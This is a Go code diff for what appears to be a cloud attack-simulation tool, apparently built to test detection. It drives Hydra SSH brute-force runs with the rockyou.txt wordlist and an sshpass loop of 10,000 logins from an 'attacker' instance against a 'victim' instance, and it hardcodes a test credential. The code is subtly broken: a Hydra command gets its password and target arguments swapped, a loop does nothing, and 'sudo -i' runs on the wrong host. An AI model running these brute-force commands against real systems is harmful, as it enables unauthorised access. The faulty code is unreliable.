@@ -6,6 +6,11 @@ import (
 	"github.com/aws/aws-sdk-go-v2/aws"
 )
 
+const (
+	usernamebf = "jon"
+	passwordbf = "michelle"
+)
+
 // Simulate Nmap noisy (aggressive) attack
 func simulateNoisyNmapAttack(cfg aws.Config) error {
 	_, attackerIPAddress, err := launchInstanceIfNotExists(cfg, "attacker")
@@ -53,9 +58,16 @@ func simulateNmapAttack(cfg aws.Config) error {
 
 // Simulate Hydra brute force attack with rockyou.txt or fixed password based on flag
 func simulateHydraAttack(cfg aws.Config, longwait bool) error {
-	attackerInstanceID, attackerIPAddress, err := launchInstanceIfNotExists(cfg, "attacker")
+	_, attackerIPAddress, err := launchInstanceIfNotExists(cfg, "attacker")
 	if err != nil {
 		return fmt.Errorf("failed to get or launch attacker instance: %v", err)
+	}
+
+	// Clean up any existing hydra.restore file before starting the attack
+	cleanupRestoreFileCommand := "rm -f ./hydra.restore"
+	err = executeSSHCommand(attackerIPAddress, cleanupRestoreFileCommand)
+	if err != nil {
+		fmt.Printf("Warning: failed to remove hydra.restore file. Proceeding with the attack.\n")
 	}
 
 	victimIPAddress, err := getVictimIPAddress(cfg)
@@ -63,7 +75,7 @@ func simulateHydraAttack(cfg aws.Config, longwait bool) error {
 		return fmt.Errorf("failed to get victim IP: %v", err)
 	}
 
-	// Step 1: Check if rockyou.txt wordlist is already present on the attacker instance
+	// Step 1: Ensure rockyou.txt wordlist is already present on the attacker instance
 	if longwait {
 		checkRockyouCommand := "test -f rockyou.txt && echo 'File exists' || echo 'File does not exist'"
 		checkOutput, err := executeSSHCommandWithOutput(attackerIPAddress, checkRockyouCommand)
@@ -72,7 +84,7 @@ func simulateHydraAttack(cfg aws.Config, longwait bool) error {
 		}
 
 		if checkOutput == "File does not exist\n" {
-			// If rockyou.txt is not present, download it
+			// If rockyou.txt is not present, download and decompress it
 			downloadRockyouCommand := "wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz -O rockyou.txt.tar.gz && tar -xvzf rockyou.txt.tar.gz"
 			fmt.Println("Downloading rockyou.txt wordlist on attacker instance...")
 			err = executeSSHCommand(attackerIPAddress, downloadRockyouCommand)
@@ -87,23 +99,27 @@ func simulateHydraAttack(cfg aws.Config, longwait bool) error {
 	// Step 2: Hydra brute force attack command using either rockyou.txt or fixed password
 	var attackCommand string
 	if longwait {
-		// Use rockyou.txt for brute force
-		attackCommand = fmt.Sprintf("timeout 600 hydra -l bruteforced_user -P rockyou.txt -t 64 -S -V -v -e ns -f ssh://%s", victimIPAddress)
+		// Use rockyou.txt for brute force and increase the timeout for longer search duration
+		fmt.Println("Running Hydra brute force attack with rockyou.txt wordlist...")
+		attackCommand = fmt.Sprintf("timeout 300 hydra -l %s -P rockyou.txt -t 4 -W -S -V -v -e ns -f ssh://%s ", usernamebf, victimIPAddress)
 	} else {
-		// Use a fixed password (password) for the root user
-		attackCommand = fmt.Sprintf("hydra -l brute -p poppypig -t 64 -S -V -v -f ssh://%s", victimIPAddress)
-	}
-
-	// Clean up any existing hydra.restore file before starting the attack
-	cleanupRestoreFileCommand := "rm -f ./hydra.restore"
-	err = executeSSHCommand(attackerIPAddress, cleanupRestoreFileCommand)
-	if err != nil {
-		fmt.Printf("Warning: failed to remove hydra.restore file. Proceeding with the attack.\n")
+		for i := 0; i < 10; i++ {
+			// Use a fixed password (password) for the root user
+			attackCommand = fmt.Sprintf("hydra -l %s -p %s -t 4 -S -V -v -f ssh://%s", usernamebf, victimIPAddress, passwordbf)
+		}
 	}
 
 	// Run the brute force attack with Hydra
-	fmt.Printf("Running Hydra brute force attack from attacker instance %s to victim IP %s...\n", attackerInstanceID, victimIPAddress)
+	fmt.Printf("Running Hydra brute force attack from attacker instance %s to victim IP %s...\n", attackerIPAddress, victimIPAddress)
 	s, err := executeSSHCommandWithOutput(attackerIPAddress, attackCommand)
+	fmt.Println(s)
+	if err != nil {
+		return fmt.Errorf("failed to execute Hydra attack command via SSH: %v", err)
+	}
+	// sudo -i
+	fmt.Printf("Running sudo -i command from attacker instance %s to victim IP %s...\n", attackerIPAddress, victimIPAddress)
+	pe := "sudo -i"
+	s, err = executeSSHCommandWithOutput(attackerIPAddress, pe)
 	fmt.Println(s)
 	if err != nil {
 		return fmt.Errorf("failed to execute Hydra attack command via SSH: %v", err)
@@ -293,5 +309,27 @@ func simulateBlindShellWithPortControl(cfg aws.Config) error {
 	}
 	fmt.Printf("Port close command output: %s\n", closePortOutput)
 
+	return nil
+}
+
+// simulate a brute force attack on the victim instance ssh
+func simulateBruteForceAttack(cfg aws.Config) error {
+	_, attackerIPAddress, err := launchInstanceIfNotExists(cfg, "attacker")
+	if err != nil {
+		return fmt.Errorf("failed to get or launch attacker instance: %v", err)
+	}
+
+	victimIPAddress, err := getVictimIPAddress(cfg)
+	if err != nil {
+		return fmt.Errorf("failed to get victim IP: %v", err)
+	}
+
+	// Dynamically construct the brute force attack command with the victim's IP
+	bruteForceCommand := fmt.Sprintf("for i in {1..10000}; do sshpass -p test ssh -o StrictHostKeyChecking=no jon@%s; done", victimIPAddress)
+
+	err = executeSSHCommand(attackerIPAddress, bruteForceCommand)
+	if err != nil {
+		return fmt.Errorf("failed to execute brute force attack: %v", err)
+	}
 	return nil
 }
